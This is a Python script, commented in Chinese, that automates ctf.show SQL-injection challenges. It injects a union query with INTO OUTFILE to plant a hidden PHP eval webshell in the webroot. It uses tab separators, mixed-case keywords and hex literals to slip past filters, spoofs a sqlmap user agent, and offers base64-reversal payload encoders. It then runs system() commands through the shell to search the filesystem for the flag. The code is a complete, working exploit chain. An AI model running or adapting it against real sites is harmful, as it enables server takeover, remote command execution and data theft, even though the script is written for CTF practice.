"""ctf.show os-shell 兜底通道（web213 类：flag 不在库中、在文件系统）。

流程：union … INTO OUTFILE 写 webshell（全 tab 免空格、INTO 在括号外、
列值用 hex 字面量避引号）→ HTTP POST 执行命令 → 定位并读取 flag。

用法（battle 自动调用；也可手动）：
  python scripts/ctfshow_osshell.py --base https://xxx.challenge.ctf.show \
      --entry api/index.php --param id --method PUT \
      --header "Content-Type=text/plain" [--encode b64rev2] [--shell-name .xs.php]
"""
from __future__ import annotations

import argparse
import base64
import random
import re
import sys
import time
import urllib.parse

sys.path.insert(0, __file__.rsplit("scripts", 1)[0])
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

import requests  # noqa: E402
import urllib3   # noqa: E402

urllib3.disable_warnings()

FLAG_RE = re.compile(r"(?:ctfshow|flag)\{[^}\s'\"]{1,120}\}")
GATE_UA = "sqlmap/1.5.12#stable (http://sqlmap.org)"
PHP_SHELL = b"<?php @eval($_REQUEST[1]);?>"


def encode_payload(p: str, encoder: str) -> str:
    if encoder == "b64rev2":
        a = base64.b64encode(p[::-1].encode()).decode()
        return base64.b64encode(a[::-1].encode()).decode().rstrip("=")
    if encoder == "b64rev1":
        return base64.b64encode(p[::-1].encode()).decode().rstrip("=")
    if encoder == "b64":
        return base64.b64encode(p.encode()).decode().rstrip("=")
    return p


class OssShell:
    def __init__(self, base, entry, param, method="PUT", headers=None,
                 encoder="", verify=False, cookie=""):
        self.base = base.rstrip("/") + "/"
        self.entry = urllib.parse.urljoin(self.base, entry)
        self.param = param
        self.method = method.upper()
        self.headers = dict(headers or {})
        self.encoder = encoder
        self.s = requests.Session()
        self.s.verify = verify
        self.name = "." + "".join(random.choices("abcdefgh", k=6)) + ".php"
        self.log = []

    def _headers(self):
        h = dict(self.headers)
        h.setdefault("User-Agent", GATE_UA)
        h.setdefault("Referer", "https://ctf.show/")
        return h

    def sql(self, payload: str):
        """注入请求（探针/battle 已确认的入口）。web209 系 api 每请求前
        要先 getToken.php 刷新一次性 token，缺这步一律「api鉴权失败」。"""
        try:
            self.s.get(urllib.parse.urljoin(self.base, "api/getToken.php"),
                       headers=self._headers(), timeout=15)
        except requests.RequestException:
            pass
        h = self._headers()
        if self.method == "GET":
            u = f"{self.entry}?{self.param}=" + encode_payload(payload, self.encoder)
            return self.s.get(u, headers=h, timeout=20)
        body = f"{self.param}=" + encode_payload(payload, self.encoder)
        return self.s.request(self.method, self.entry, data=body.encode(),
                              headers=h, timeout=20)

    def write_shell(self, webroot="/var/www/html/") -> bool:
        T = "\t"
        sel = "SeLeCt"
        hexshell = "0x" + PHP_SHELL.hex()
        path = webroot + self.name
        p = (f"0'union{T}{sel}{T}1,1,{hexshell}{T}into{T}outfile{T}'{path}'#")
        self.sql(p)
        time.sleep(0.5)
        return self.alive()

    def _shell_headers(self):
        """shell 交互头：必须 urlencoded，PHP 才会解析 $_REQUEST/$_POST。"""
        h = self._headers()
        h["Content-Type"] = "application/x-www-form-urlencoded"
        return h

    def alive(self) -> bool:
        u = urllib.parse.urljoin(self.base, self.name)
        r = self.s.post(u, data={"1": "echo 7355608;"}, headers=self._shell_headers(),
                        timeout=20)
        if "7355608" in r.text:
            return True
        r = self.s.get(u, params={"1": "echo 7355608;"}, headers=self._shell_headers(),
                       timeout=20)
        return "7355608" in r.text

    def cmd(self, c: str) -> str:
        u = urllib.parse.urljoin(self.base, self.name)
        r = self.s.post(u, data={"1": "system('" + c + "');"},
                        headers=self._shell_headers(), timeout=25)
        if not r.text.strip():
            r = self.s.get(u, params={"1": "system('" + c + "');"},
                           headers=self._shell_headers(), timeout=25)
        return r.text

    def hunt_flag(self) -> str:
        """ls 常见位置 → 找含 ctfshow{ 的文件 → cat。"""
        out = self.cmd("ls -la / /var/www/html /flag* 2>&1 | head -60")
        self.log.append(out)
        m = FLAG_RE.search(out)
        if m:
            return m.group(0)
        for d in ("/", "/var/www/html/", "/root/"):
            listing = self.cmd(f"ls {d} 2>&1")
            self.log.append(listing)
            for line in listing.splitlines():
                name = line.strip().split()[-1] if line.strip() else ""
                if not name or "." in name[:1] and name.startswith("."):
                    continue
                if "flag" in name.lower():
                    body = self.cmd(f"cat {d}{name} 2>&1 | head -30")
                    self.log.append(body)
                    m = FLAG_RE.search(body)
                    if m:
                        return m.group(0)
        # 兜底：全盘文本搜（小文件系统可行）
        body = self.cmd(
            "grep -rl 'ctfshow{' / --include='*' --exclude-dir=proc "
            "--exclude-dir=sys --exclude-dir=dev 2>/dev/null | head -5")
        self.log.append(body)
        for f in body.split():
            cat = self.cmd(f"head -c 400 {f} 2>&1")
            m = FLAG_RE.search(cat)
            if m:
                return m.group(0)
        return ""


def try_osshell(base: str, entry: str, param: str, method: str,
                headers: dict, encoder: str = "") -> tuple[str, list[str]]:
    """battle 兜底入口：返回 (flag, 命令输出日志)。"""
    sh = OssShell(base, entry, param, method, headers, encoder)
    if not sh.write_shell():
        print("   [osshell] webshell 写入失败（outfile 不可用）", flush=True)
        return "", []
    print(f"   [osshell] webshell 就绪: {sh.name}", flush=True)
    flag = sh.hunt_flag()
    return flag, sh.log


def main():
    ap = argparse.ArgumentParser(description="ctf.show os-shell 兜底")
    ap.add_argument("--base", required=True)
    ap.add_argument("--entry", default="api/index.php")
    ap.add_argument("--param", default="id")
    ap.add_argument("--method", default="PUT")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--encode", default="")
    ap.add_argument("--webroot", default="/var/www/html/")
    a = ap.parse_args()
    headers = dict(kv.split("=", 1) for kv in a.header)
    sh = OssShell(a.base, a.entry, a.param, a.method, headers, a.encode)
    if not sh.write_shell(a.webroot):
        print("webshell 写入失败")
        return 1
    print("webshell:", sh.name)
    flag = sh.hunt_flag()
    print("flag:", flag or "未找到")
    return 0 if flag else 1


if __name__ == "__main__":
    sys.exit(main())
